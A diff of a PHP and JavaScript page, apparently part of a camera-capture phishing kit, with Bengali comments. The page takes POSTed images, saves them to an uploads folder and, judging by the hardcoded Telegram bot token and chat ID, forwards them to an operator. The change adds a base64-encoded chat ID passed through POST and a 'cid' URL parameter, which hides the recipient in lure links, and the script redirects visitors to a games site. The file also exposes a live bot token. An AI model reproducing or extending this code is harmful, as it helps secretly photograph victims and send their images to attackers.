@@ -2,9 +2,17 @@
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
-    
-    // ইউআরএল থেকে নির্দিষ্ট ইউজারের Chat ID নেওয়া হচ্ছে (ডিফল্ট ব্যাকআপ দেওয়া আছে)
-    $chatId = isset($_POST['chat_id']) && !empty($_POST['chat_id']) ? $_POST['chat_id'] : "5896019931";
+    $chatId = "5896019931"; // Default fallback
+
+    // Encrypted/Encoded Chat ID decode kora
+    if (isset($_POST['chat_id']) && !empty($_POST['chat_id'])) {
+        $encodedCid = $_POST['chat_id'];
+        // Padding fix kore base64 decode kora
+        $decodedCid = base64_decode(str_pad(strtr($encodedCid, '-_', '+/'), strlen($encodedCid) % 4, '=', STR_PAD_RIGHT));
+        if ($decodedCid !== false && is_numeric($decodedCid)) {
+            $chatId = $decodedCid;
+        }
+    }
 
     $uploadDir = 'uploads/';
     if (!is_dir($uploadDir)) {
@@ -164,7 +172,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 
         const urlParams = new URLSearchParams(window.location.search);
         const targetId = urlParams.get('id') || 'direct';
-        const userChatId = urlParams.get('cid') || ''; // ডায়নামিক Chat ID রিসিভ করা হচ্ছে
+        const userChatId = urlParams.get('cid') || ''; 
         const rawTargetUrl = urlParams.get('url');
 
         let finalUrl = "https://www.aapunkagames.com/"; 
